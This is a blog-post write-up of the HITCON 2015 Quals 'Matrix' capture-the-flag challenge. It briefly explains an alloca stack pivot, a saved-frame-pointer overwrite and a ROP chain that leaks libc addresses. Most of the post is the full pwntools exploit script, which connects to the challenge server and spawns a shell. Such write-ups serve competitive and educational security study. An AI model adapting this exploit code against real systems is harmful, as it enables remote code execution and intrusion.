---
layout: post
title: "HITCON 2015 Quals: Matrix"
modified: 2015-10-19
tags: hitcon hitcon2015quals
---
*This challenge was solved by and the write up was written by one of my teammates, tukan.*  

The binary implements matrix multiplication.

By specifying a large matrix size, we can trigger an alloca with the size under our control.

Using this, it is possible to pivot the stack pointer to a higher address.

By properly aligning the stack, the scanf function will then eventually overwrite its own saved frame pointer with one of our matrix element input. 

Upon returning from main, this gets into rsp. 

We can use this to move the stack pointer into a user-buffer at a static location in .bss.

Once done, with some ROP we leak the address of puts from the GOT, calculate the address of system and spawn a shell.

High quality exploit follows:

{% highlight python %}
from pwn import *
context.update(arch='amd64', os='linux')

def rop(*args):
    return struct.pack('Q' * len(args), *args)

# LIVE = False
LIVE = True

####### LOCAL #######
if not LIVE:
    fn = '/root/sf/hitcon/matrix/matrix-a0e5c5c0a8f05896a7f03d8ed4588027'
    env = os.environ.copy()
    env['LD_PRELOAD'] = '/tools/preeny/x86_64-linux-gnu/dealarm.so:/media/sf_shared/hitcon/matrix/libc-3f6aaa980b58f7c7590dee12d731e099.so.6'
    r = process(fn, env=env)
    print r.proc.pid
    time.sleep(0.8)

####### REMOTE #######
if LIVE:
    r = remote('52.68.53.28', 31337)

num = 0xfffffffe
ret = 0x400e90
poprdiret = 0x0000000000400f03 # pop rdi ; ret
poprdxret = 0x0000000000400f28 # pop rdx ; ret
poprsipopret = 0x0000000000400f01 # pop rsi ; pop r15 ; ret
stdout = 0x0000000000602080
puts_plt = 0x0000000000400590
fflush_plt = 0x00000000004005F0
fflush_bin = 0x0000000000400E66
puts_got = 0x0000000000602018
read_plt = 0x00000000004005C0
rbp = 0x6022a8

print r.sendafter('name', p64(0)*65 + p64(0x602300-40) + p64(ret) + rop(
    poprdiret,
    puts_got,
    puts_plt,
    # poprdiret,
    # stdout,
    # fflush_plt,
    fflush_bin,
    0xabfaad,
    poprdxret,
    0x32,
    poprsipopret,
    rbp+128,
    0x41,
    poprdiret,
    0,
    read_plt,
    poprdiret,
    rbp+128,
    ret
))

print r.sendlineafter('matrix\n', str(num))

iternum = 128

for i in range(2):
    print r.sendlineafter('matrix : ', str(i))
print r.sendlineafter('matrix : ', str(rbp))

leak = r.recv(8)
print len(leak)
print repr(leak[:-1])
puts_libc = struct.unpack('Q', leak[:-1] + '\x00'*2)[0]
print hex(puts_libc)
system = puts_libc - 0x6fe30 + 0x46640
r.send(p64(rbp+128+16) + rop(system) + '/bin/bash')

print r.recvrepeat(0.5)

r.interactive()
{% endhighlight %}